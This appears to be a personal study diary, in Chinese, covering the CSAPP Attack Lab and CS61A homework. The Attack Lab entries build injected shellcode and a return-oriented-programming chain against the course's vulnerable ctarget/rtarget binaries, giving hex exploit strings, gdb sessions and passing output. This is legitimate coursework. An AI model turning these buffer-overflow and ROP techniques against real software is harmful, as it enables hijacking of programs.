- 入参，怎么才能让touch2的入参（`%rdi`）赋值为自己的cookie呢？

这里作者简单介绍了下大体实现思路：

> Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.

实现思路：首先将cookie -> rdi，然后调用ret。这时栈回收，并且将修改后为touch2的初始地址作为执行地址。这样出现的问题就是，函数返回后，rdi会保存的是之前cookie的值吗？这就涉及到了调用者和被调用者寄存器的保存问题，这里模糊不清，证明当时没学明白。

重新学习3.7.5 Local Storage in Registers

这里的caller代指P函数，callee代指P函数中调用的Q函数。

- caller为了确保调用完callee后不影响后续代码执行，
- callee-registers：确保Q（callee）执行完毕后，这些寄存器的值不会改变。（那为啥不让caller直接保存所有的寄存器值？-因为返回值还是需要Q改变的）典型的%rbx, %rbp, and %r12–%r15
- caller-registers：可以被任意修改的寄存器。除了%rbx, %rbp, and %r12–%r15和%rsp，其他的寄存器。

总结的话就是函数Q除了%rbx, %rbp, and %r12–%r15的状态不能动外，其他寄存器状态都可以动。

理解了调用者寄存器和被调用者寄存器区别，这样cookie -> rdi后，即使函数控制返回了，可能会带着cookie的rdi来进入touch2函数。

所以实现思路应该是可行的。但是这样存在一个问题：因为exploit string输入到getbuf后，getbuf会将栈回收，会导致rdi无法被赋值cookie，直接执行到touch2的地址。

那么需要重新思考下思路：~~如何保证栈不会被回收~~？这样就可以让getbuf执行完毕后，下一步执行地址直接到栈的漏洞代码中。或许还有其他的好玩的方法？其实栈并没有被回收，数据均存在，那么就可以考虑漏洞代码的编写。

[重新整理后的思路](https://github.com/kcxain/CSAPP-Lab/blob/master/Notes/Lab03-Attack_Lab.md)：

- 将test调用getbuf之前保存的返回地址，改为漏洞代码执行的地址。
- 漏洞代码实现：
  - 将cookie值赋值给%rdi
  - push touch2的地址
  - ret

要想获得漏洞代码执行的地址，就需要获取执行getbuf时栈顶（%rsp）位置。初步想在getbuf分配栈空间的位置打断点，通过调试查看rsp即可。

但是我没法让程序ctarget正常跑起来 :( 

思考了一会，woc，第一个答案输入进去，不就可以正常执行了吗？

```bash
(gdb) run -q -i exploit-raw.txt 
```

查看getbuf分配栈空间后的栈顶：

```assembly
(gdb) disassemble getbuf
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.
(gdb) b *0x4017af
(gdb) continue
Continuing.

Breakpoint 3, 0x00000000004017af in getbuf () at buf.c:14
14      in buf.c

```

在调用call之前查看rsp的值:`0x5561dc78`

```bash
(gdb) print $rsp
$1 = (void *) 0x5561dc78
```

获取到可以注入漏洞代码的地址后，~~我们可以将最后的ret指令放在0x5561dc78位置，然后补充这个漏洞代码~~。（这里勘误：因为漏洞代码的执行顺序是从低地址到高地址的方向，栈空间是从高地址向着低地址生长。而顶位置正是地址较小的位置，所以栈顶位置`0x5561dc78`从头开始放漏洞代码即可）

获取touch2的地址：`0x4017ec`

```bash
(gdb) b touch2
Breakpoint 4 at 0x4017ec: file visible.c, line 40.
```

漏洞代码`p2.s`：

```assembly
movq $0x59b997fa,%rdi
pushq $0x4017ec
ret
```

获取漏洞代码的字节表示：

```bash
unix> gcc -c p2.s
unix> objdump -d p2.o > p2.d
```

`p2.d`内容：

```assembly
  1
  2 p2.o:     file format elf64-x86-64
  3
  4
  5 Disassembly of section .text:
  6
  7 0000000000000000 <.text>:
  8    0: 48 c7 c7 fa 97 b9 59  mov    $0x59b997fa,%rdi
  9    7: 68 ec 17 40 00        push   $0x4017ec
 10    c: c3                    ret
~

```

~~可以看出这段代码占的空间为13字节，所以漏洞代码的执行地址应该是栈顶地址`0x5561dc78`减去`0xd`，即为`0x5561dc6b`。~~

数据构造：根据小端存储的特性，应该将输入的字节数据中，漏洞代码放在前面，从而存储在栈顶位置；而要被替换的返回地址要在后面存储，从而存储在栈底位置。按照这样构造逻辑，可以实现`exploit2.txt`

```tex
c3 00 40 17 ec 68 59 b9
97 fa c7 c7 48 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
6b dc 61 55 00 00 00 00
```

执行

```
unix> ./hex2raw < exploit2.txt > exploit-raw2.txt
unix> ./ctarget -q -i exploit-raw2.txt
```

报错了，查看下问题存在的原因：

```bash
crx@ubuntu:03_attack_lab$ ./hex2raw < exploit2.txt > exploit-raw2.txt
crx@ubuntu:03_attack_lab$ ./ctarget -q -i exploit-raw2.txt
Cookie: 0x59b997fa
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:C3 00 40 17 EC 68 59 B9 97 FA C7 C7 48 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00

```

已经修改了真正的漏洞代码地址：执行地址应该是栈顶地址`0x5561dc78`加上`0xd`，即为`0x5561dc85`。重新执行，还是报错。

单步执行下，看看是否填充字符后，数据怎么分布的：

```bash
(gdb) disassemble
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
=> 0x00000000004017bd <+21>:    ret
End of assembler dump.
(gdb) x/50xb $rsp
0x5561dca0:     0x6b    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
0x5561dca8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcb0:     0x24    0x1f    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dcb8:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dcc0:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dcc8:     0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
0x5561dcd0:     0xf4    0xf4
(gdb)
```

在getbf返回之前下的断点，然后打印此时栈空间的数据，发现从栈顶`0x5561dca0`开始保存的居然是漏洞的执行地址`0x5561dc6b`，而正常情况下这里应该保存的是漏洞代码。而漏洞的执行地址应该存放`0x5561dcc8`即`%rsp + 0x28`，为什么会这样？😶

好吧，这样是没问题的，因为断点打错了，应该是打在还尚未将栈空间回收的`0x4017b9`处，重新来：

```
(gdb) x/50xb $rsp
0x5561dc78:     0xc3    0x00    0x40    0x17    0xec    0x68    0x59    0xb9
0x5561dc80:     0x97    0xfa    0xc7    0xc7    0x48    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dca0:     0x6b    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
0x5561dca8:     0x00    0x00
```

还是报错。

思考后发现存储的时候，没有考虑到小端存储和指令从小到大的地址进行执行的原理：最后存放的漏洞代码地址，要放在最后面，这个没什么问题；但是漏洞代码怎么执行呢？应该是从之前的栈顶往地址高的地方执行，所以栈顶从下至上（地址从低到高）保存指令应该依次是：

```assembly
0x5561dc78: movq $0x59b997fa,%rdi
		+7	pushq $0x4017ec
		+c	ret
```

所以在拼装`exploit2.txt`的时候，最前面的数据就是直接放漏洞代码的字节表示`p2.o`。之前出错就是因为没有考虑到栈的地址是从下到上逐渐递增的。

重新改写`exploit2.txt`：

```
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
6b dc 61 55 00 00 00 00
```

执行还是报错，查看此时栈保存的指令：

```assembly
(gdb) disassemble
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
=> 0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret

(gdb) x/10i $rsp
   0x5561dc78:  mov    $0x59b997fa,%rdi
   0x5561dc7f:  push   $0x4017ec
   0x5561dc84:  ret
   0x5561dc85:  add    %al,(%rax)
   0x5561dc87:  add    %al,(%rax)
   0x5561dc89:  add    %al,(%rax)
   0x5561dc8b:  add    %al,(%rax)
   0x5561dc8d:  add    %al,(%rax)
   0x5561dc8f:  add    %al,(%rax)
   0x5561dc91:  add    %al,(%rax)

(gdb) x/50xb $rsp
0x5561dc78:     0x48    0xc7    0xc7    0xfa    0x97    0xb9    0x59    0x68
0x5561dc80:     0xec    0x17    0x40    0x00    0xc3    0x00    0x00    0x00
0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dca0:     0x6b    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
```

这样应该是没问题的，那我们单步执行，看看getbuf执行ret后，rsp是否保存的是漏洞代码执行位置...等等，我怎么保存的地址是`0x5561dc6b`？

改过来以后的`exploit2.txt`:

```tex
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

重新执行就可以了：

```bash
unix$ ./ctarget -q -i exploit-raw2.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00

```

## 5.13（delete）

leve2的思考：漏洞代码字节码和要覆盖的地址要怎么写入到48个字节中？

Q1:为什么要放到48个字节中？

A1:因为要修改test调用getbuf之前保存的地址信息，而这个信息被保存在getbuf的栈空间往上40个字节的位置，占位空间为8个字节（void*）。

Q2:如何组织48个字节的内容？

A2:根据栈空间从高到低的生长特性和小端存储的特性，可以得知输入的数据从开始到最后，就是沿着栈地址空间从低到高的方向存储的。但是需要注意的问题就是小端存储的地址信息`0x5561dc78`，实际在第40个字节处的十六进制保存形式为`78 dc 61 55 00 00 00 00`。

至于漏洞代码，直接从0字节开始正常保存即可。所以组织形式就是开始保存漏洞代码，然后填充0，直到第40个字节开始填充要修改的地址信息：`78 dc 61 55 00 00 00 00`。

### phase3

首先理解函数`hexmatch`功能：

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
 }
```

`sprintf(s, "%.8x", val);`:将`unsigned`类型的值val，存储在字符指针s所指的地址处，而`s`的位置是随机的。那么如果val=0x12345678，那么s处存的是什么呢？存的就是12345678的字符形式“12345678”。然后从低到高的16进制数据为`31 32 33 34 35 36 37 38`。

那么这个函数`hexmatch`功能就可以理解了：

将一个无符号整型变量参数转换为字符串后，跟另一个字符串变量的前9个字符进行比对，相同返回1，不同返回0。

然后题目让我们直接执行touch3不返回test，看下touch3的代码：

```C
 void touch3(char *sval)
{
    vlevel = 3;
    /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
 }
```

也就是说要想让touch3成功执行，就需要让touch3的入参字符串跟整型cookie的字符串表示形式相同才可以。

现在cookie的无符号整型表示为：`0x59b997fa`，字符表示为`35 39 62 39 39 37 66 61 00`.~~实际小端存储的形式是`fa97b959`。所以其字符串的表示为`66 61 39 37 62 39 35 39 00`。所以输入的字符串就可以确定是这样的了。~~

leve3的大体实现思路：

- 将getbuf执行完后的返回地址改为漏洞代码的地址。
- 漏洞代码需要实现下面几个功能：
  - 将入参置为指向一段值为`35 39 62 39 39 37 66 61 00`的指针。
  - 调用touch3函数

这里需要注意的是，调用touch3的时候，原先getbuf用于存储数据的栈，就会被函数 hexmatch and strncmp用来存储数据。如果这两个函数的栈空间数据正好写入到了漏洞代码的位置，那么就会导致本次攻击代码失败。

那么怎么才能保护getbuf中写入的漏洞代码呢？可以考虑把`cookie`的字符串数据存在`test`的栈上，其它部分与上题相同。

实现思路是：

将getbuf的返回地址改为漏洞代码的位置，然后返回地址上面保存cookie字符串表示。漏洞代码将rdi置为cookie字符串保存的位置，然后将touch3的位置`0x4018fa`push到栈中，然后ret，让程序计数器执行touch3。

这样数据就有56个字节的数据了，栈顶地址为`0x5561dc78`，所以cookie字符串保存的位置就是栈顶地址向上的第48个字节(从0开始)的位置：`0x5561dcA8`，保存的数据是`35 39 62 39 39 37 66 61 00`

漏洞代码编写为：

```assembly
movq $0x5561dcA8,%rdi
push $0x4018fa
ret
```

对应的字节码为：

```assembly
  1
  2 p3.o:     file format elf64-x86-64
  3
  4
  5 Disassembly of section .text:
  6
  7 0000000000000000 <.text>:
  8    0: 48 c7 c7 a8 dc 61 55  mov    $0x5561dca8,%rdi
  9    7: 68 fa 18 40 00        push   $0x4018fa
 10    c: c3   
```

这样总的输入字符串为：

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
00
```

将其转换为输入字符串后，执行结果：

```bash
crx@ubuntu:03_attack_lab$ ./ctarget -q -i exploit3-raw.txt
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

用时4h，卡住我的主要问题是：

1. `sprintf`函数作用：是将一个参数以某种形式转换为字符串，然后保存在某个字符串指针处。在这个题目中，是将cookie代表的unsigned类型的值`0x59b997fa`格式化为一个以十六进制表示的字符串“59b997fa”，并将结果存储在字符串数组 `s` 中。而字符串`"59b997fa"`的实际是按照每个字符的ascii码来表示的，即为`35 39 62 39 39 37 66 61`。这里花了大量时间去考虑数值类型的cookie到底被转换成什么字符串了，其实这里sprintf的本质就是将数据以16进制形式打印出来，并将打印结果存储起来:

   > [The C library function **int sprintf(char \*str, const char \*format, ...)** sends formatted output to a string pointed to, by **str**.](https://www.tutorialspoint.com/c_standard_library/c_function_sprintf.htm)

   这个问题暴露出来的弱点就是不理解函数到底做了什么，导致花的时间很多

2. 计算字符串保存的位置：因为getbuf申请了`0x24`十进制为40的栈空间，所以从0开始的话，40到47存放的是漏洞代码地址，然后48到55存放的是cookie十六进制表示的字符串。

3. 另一个就是新知识：既然栈会被新的函数参数填入，可能会导致漏洞代码失效，那么我就在test函数上存放一些数据。

现在去拿眼镜。

## 5.14(delete)

### phase4

[**返回导向编程**](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/) (Return Oriented Programming)，其主要思想是在 **栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**

返回导向编程这一名称的由来是因为其核心在于利用了指令集中的 ret 指令，从而改变了指令流的执行顺序，并通过数条 gadget “执行” 了一个新的程序。

ret指令相当于`pop ip`，即将栈顶保存的数据作为程序计数器执行的地址。

梳理下phase4的问题：

现在由于加入了一些限制条件，需要用已有代码而不能自己编写漏洞代码来攻击程序。现在想实现的是跟phase2相同的想法：

1. 将getbuf调用后的返回地址设置为漏洞代码地址
2. 调用漏洞代码
   1. 将cookie值作为touch2入参
   2. 调用touch2

之前的思路是将漏洞代码放到getbuf申请的栈顶位置，然后调用getbuf后返回的地址设置为漏洞代码的位置，这样就可进行攻击了。之前的漏洞代码汇编语言实现为：

```assembly
movq $0x59b997fa,%rdi
pushq $0x4017ec
ret
```

但是现在漏洞代码需要通过已有的代码来拼凑，并且无法做到在已有代码中找到一段代码包含cookie值`0x59b997fa`，也不能找到`pushq $0x4017ec`的现有代码。

现在的思路是：

1. 要想`cookie`的值赋值给`%rdi`，可以先将`cookie`放在栈顶中（超量写入即可），然后调用`popq %rdi`，使栈顶中的`cookie`赋值给`%rdi`.
2. 如果想要访问touch2的地址，可以将touch2的地址最后写入栈顶中，然后ret即可。

最终想要实现的效果如图所示：

![image-20240514194618556](E:\code_life\1_project\cs61a\2024notes\image\image-20240514194618556.png)

但是发现`gadget01`的代码实现即`5f`在`<start_farm>`和`<end_farm>`之间并没有直接实现，那我们可以退而求其次，看看能否先将cookie存储到其他寄存器中，然后再使用`mov 寄存器, rdi`。

`popq %rax`字节表示为：`0x58`，查看在`<start_farm>`和`<end_farm>`之间是否有这个指令：

```assembly
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3						ret 
```

可以发现正好在`0x4019ca`后面偏移3个字节的位置即`0x4019cc`的位置存在这个指令，并且因为`0x90`是`nop`指令不做任何操作，而后面的`c3`恰好是我们需要的`ret`指令的字节表示，所以可以将`gadget01`的位置设置为`0x4019cc`，实现的指令为：

```assembly
#gadget01：
popq %rax
ret
```

那么相对应的`gadget02`的指令应该为

```assembly
#gadget02
movq %rax,%rdi # 48 89 c7
ret			   # c3
```

然后就在`<start_farm>`和`<end_farm>`之间寻找`48 89 c7`的指令是否存在并且后面是否存在`ret`指令：

```assembly
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret    
```

这样在地址`0x4019a2`处的指令恰好满足我们的需求，所以可以确定将`gadget02`的位置设置为`0x4019a2`，这样修改后的栈空间示意图为：

![image-20240514200812560](E:\code_life\1_project\cs61a\2024notes\image\image-20240514200812560.png)

所以设计的输入数据的思路为：4017ec

- 前五行：前40个字节无效输入均为0
- 第六行：索引40到47处保存gadget01代码地址
- 第七行：索引48到55处保存cookie
- 第八行：索引56到63保存gadget02代码地址
- 第九行：索引64到71保存touch2的地址

即：

```tex
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
cc 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

执行后的成功结果：

```bash
crx@ubuntu:03_attack_lab$ ./rtarget -q -i exploit4-raw.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

## 5.15

[Homework 6: OOP, Linked Lists](https://cs61a.org/hw/hw06/)

Vending Machine：

需求是创建一个自动售卖机，这个类想实现的是：

1. 属性：创建出指定出售货品和单价的，数量为空自动售卖机
2. 方法：
   1. 存货：增加售卖机的货品
   2. 加钱：若货为空：吐出刚给的钱
   3. 售卖：
      1. 刚给够钱，然后根据单价吐出相应数量的货
      2. 没给够，根据最低单价和刚给的钱，算差价
      3. 给多了，给相应的货并且找零

按照这样的思路，设计下代码的大体实现：

- 类属性：货物名称``product``，单价``price``，存货量`inventory`和当前投币金额`balance`。并且初始化的时候，让存货量和投币金额为0

- 方法：

  - 存货`restock(nums)`：存货量`inventory` += `nums`。并且输出当前存货量：

    ```py
    'Current' + product + 'stock: ' + str(inventory)
    ```

  - 投钱`add_funds(money)`：

    - 若此时存货量`inventory` = 0，则输出无存货：

      ```py
      'Nothing left to vend. Please restock. Here is your $' + str(money) + '.'
      ```

    - 此时存货量`inventory` != 0，投币金额`balance` += `money`，并且输出：

      ```py
      'Current balance: $' + str(balance)
      ```

  - 取货`vend()`：

    - 若此时存货量`inventory` = 0，则输出

      ```py
      'Nothing left to vend. Please restock.'
      ```

    - 如果`balance < price`，计算能拿到一个货物的话，还需要多少钱`diff = price - balance`：输出想要购买一个货物还需要多少钱：

      ```py
      'Please add $'+ str(diff) + ' more funds.'
      ```

    - 如果`balance == price`，将投币量置为0，存货量-1，输出

      ```py
      'Here is your ' + product + '.'
      ```
      
    - 如果`balance > price`，找零`check = balance - 1*price`，将投币量置为0，存货量-1，然后取货`inventory -= 1`并且输出

      ```py
      'Here is your ' + product + ' and $' + str(check) +' change.'
      ```
<<<<<<< HEAD

实现了hw06，下午想了解下未来的路该怎么走。刷到了[宿琛的经验分享：非计算机专业的人如何转行程序员（宿琛）](https://www.bilibili.com/video/BV1R44y1H77u/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&vd_source=842936ebeedd7cce8bb2e1922b41edf1)。视频分享了这个哥们gap了一年学习计算机基础，然后找到工作的故事。然后下面的评论区截取了一些耐人寻味的评论：

> A：1年能把这8个课程学完吗？
>
> B：看天赋。大多数人是做不到的。写lab的时间是不可控的。debug的时间另算，遇到完全没思路的，冥思苦想，不知道什么时候想得出来；上网找答案，则没有那种独自思考解决问题的成就感。并且，不是自己冥思苦想解决的，得到的收获都不会太深刻。如果仅仅是看视频看书过一遍，不用说一年，半年就能看完很多课程了，但是没有经过大量的思考把lab写出来，真的敢说自己已经懂了？在学习这件事上还是做个老实人比较好，不要自欺欺人

嗯，宿琛的经历的确很强，但是因为很多人没法亲身实践这个经历，所以产生一些对于学习方法的困惑是很正常不过的。但是为啥我就选择这条艰苦的道路了呢？因为“二者不可得兼，舍鱼而取熊掌者也”。

一是出于对当前工作的不满，这个工作实在是太无聊了；另一个就是会想，我的人生就到此为止了吗？我怕工作稳定后，仿佛人生就停滞一般一直在循环往复着同一天，我想活365天而不是一天重复365遍。😉

二是对于自己能力的自信，也让我乐于尝试这个挑战。经历过半年的考研生涯，从无人能说的痛苦中蜕变的我，有什么是做不到？减脂成功并且不断在跑步道路上前进的我，有什么做不到的？我知道自己的弱点，也知道自己的懒惰和松弛，但是我有信心跟它们好好相处。因为我知道，当负面情绪来的时候，是那个真实的自己在向我求助！我愿意好好爱自己，也愿意包容自己的这些缺憾。所以即使一年的gap有时候会因为没人合作而感到一丝丝无聊，但是对于愿意了解自己的我来说，能够让我更好地了解自己并且能让我提升处理负面情绪的能力，这也是我希望自己能做的更好地地方。

三是我的家人对我的支持。感谢伟大的父亲母亲的全力支持，还有我可可爱爱姑娘的信任和陪伴，也谢谢兄弟们的无私帮助。我相信有你们，我能更好地走到彼岸。

嗯，现在是5月中旬，我现在两门课程，cs61a还剩下5周的学习计划，即一个月左右的时间就可以完成了。当时给自己定的时间是截止到6月7号搞完。

csapp刚刚完结attack lab，还剩下6个周的学习计划，也就是说到7月初即可完成csapp的学习，这也是当时制定的学习计划ddl。

## 5.16

关系过于单一的脆弱的后果就是无趣，寄期待和希望于另一半过于自私和残忍。

## 5.17

跟朋友们聊天，关心他们，感受到人与人之间的联系是非常棒的。今天上午就是阅读梗概，下午把行李寄过去。

- see ourselves as designers of languages

表达式expression计算并返回一个值，而语句statement程序执行的基本单位，可能会包含一个至多个表达式。

**3.2函数式编程**

- 前缀表达式：操作符和操作数都被放在一对括号里`(quotient 10 2)`
- producure：`(define (<name> <formal parameters>) <body>)`
- 符号数据：只是引用狗这个词，而不在乎其属性的特性。`(list 'a 'b)`-->`(a b)`

**3.3异常**


## 5.21

变得更好！

本周计划：

cs61a：

- 第九周+第十二、十三周的学习计划
- ants项目一阶段

csapp：

- 完成architecture lab

阅读：

- 你好旧时光

**Q3: FreeChecking分析**

- 初始化方法：包含已用免费提取的次数`free_times`=0
- `withdraw(money)`：
  - 如果`free_times`小于`free_withdrawals`的总次数
    - 如果`amount<= balance`，则金额减去`amount`，返回剩余金额，且`free_times += 1`
    - 如果`amount> balance`，则金额不变，返回`Insufficient funds`，且`free_times += 1`
  - 如果`free_times`大于等于`free_withdrawals`的总次数，这时候需要提取费用`withdraw_fee`，所以每次提取金额为两者之和`fee_included_amount`
    - 如果`fee_included_amount <= balance`，则金额减去`fee_included_amount`
    - 如果`fee_included_amount  > balance`，则金额不变，返回`Insufficient funds`

## 5.22

- For `s.rest.first.rest` to exist at all, the second element of `s`, called `s.rest.first`, must itself be a linked list.

```py
def strange_loop():
    """Return a Link s for which s.rest.first.rest is s.

    >>> s = strange_loop()
    >>> s.rest.first.rest is s
    True
    """
    s = Link(1, Link(Link(2)))
    s.rest.first.rest = s
    return s
```

跳读第三章1+2（预计时间1h）

**3.1**

- interpreters have an elegant common structure: two mutually recursive functions. The first evaluates **expressions** in environments; the second **applies functions to arguments**.

**3.2**

- introduce a high-level programming language that encourages a functional style

- Scheme is a dialect of [Lisp](http://en.wikipedia.org/wiki/Lisp_(programming_language)).Scheme exclusively uses prefix notation

- if:`(if <predicate> <consequent> <alternative>)`

- function:`(define (<name> <formal parameters>) <body>)`

- Anonymous functions `(lambda (<formal-parameters>) <body>)` using the `lambda` special form

- ```scheme
  (define (plus4 x) (+ x 4))
  (define plus4 (lambda (x) (+ x 4)))
  ```

- lambda expression can be used as the operator in a call expression：`((lambda (x y z) (+ x y (square z))) 1 2 3)`

- `(list 'a 'b)`：refer to the symbols `a` and `b` rather than their values by preceding them with a single quotation mark 

## 5.23

**3.3**

- Raising exceptions
- Handling exceptions

构建前缀表达式表达式树的一般步骤：

从前缀表达式的开头开始，读取每个符号（运算符或操作数）。
如果符号是操作数，则创建一个叶子节点，并将该操作数作为节点的值。
如果符号是运算符，则创建一个内部节点，并将该运算符作为节点的值。然后，根据该运算符的操作数数量，递归地构建左子树和右子树。

下面是一个示例，将前缀表达式 "+ * 3 4 5" 转换为表达式树：

1. 从前缀表达式的开头开始，第一个符号是 "+"，因此创建根节点，值为 "+"。
2. 下一个符号是 "*"，它是 "+" 的左子节点。创建一个内部节点，值为 "*"。
3. "*" 的左子节点是数字 3，右子节点是数字 4。
4. "+" 的右子节点是数字 5。

最终的表达式树如下所示：

```tex
   +
  / \
 *   5
/ \
3  4
```

**3.4**

- *lexical analyzer* partitions the input string into ***tokens***, which are the minimal syntactic units of the language such as names and symbols. 
- *syntactic analyzer* constructs an expression tree from this sequence of tokens.

## 5.27

本周计划：

1. 跑步50km
2. cs61a：12周和13周的任务+`scheme`项目的part1+2
3. csapp：完成[Lab04-Architecture_Lab](https://github.com/kcxain/CSAPP-Lab/blob/master/Notes/Lab04-Architecture_Lab.md)
4. 读完一本书

今天学习：[lab9](https://cs61a.org/lab/lab09/)

计算两个数的最大公约数（GCD，Greatest Common Divisor）的方法有多种，最常用的是欧几里得算法（Euclidean Algorithm）。该算法基于以下原理：两个数的最大公约数等于其中较小的数与两数之差的最大公约数。这个过程可以反复应用，直到两个数之一为零。

欧几里得算法可以用递归方式实现：

```py
def gcd_recursive(a, b):
    if b == 0:
        return a
    else:
        return gcd_recursive(b, a % b)

# 示例
print(gcd_recursive(48, 18))  # 输出 6
print(gcd_recursive(56, 98))  # 输出 14
```

解释：

- 如果 *b* 为零，返回 *a*。
- 否则，递归调用函数，*b* 和 𝑎mod  𝑏作为参数。

而这里用`scheme`语言实现的话，因为不熟悉语法和算法，现在拿答案来分析下实现思路：

```scheme
(define (max a b) (if (> a b) a b))
(define (min a b) (if (> a b) b a))
(define (gcd a b)
  (cond ((zero? a) b)
        ((zero? b) a)
        ((= (modulo (max a b) (min a b)) 0) (min a b))
        (else (gcd (min a b) (modulo (max a b) (min a b)))))
)
```

解释：

- `base case`：如果*a*或者*b*中的某一个为0，则输出不为0的另一个值
- 如果`a mod b == 0`，那么输出*b*（默认*b*为最小值）
- 否则，递归调用函数，将*b*和`a % b`作为参数

但是因为在这里并没有直接指出a和b的大小，所以需要时刻判断两个值的大小。

## 5.28

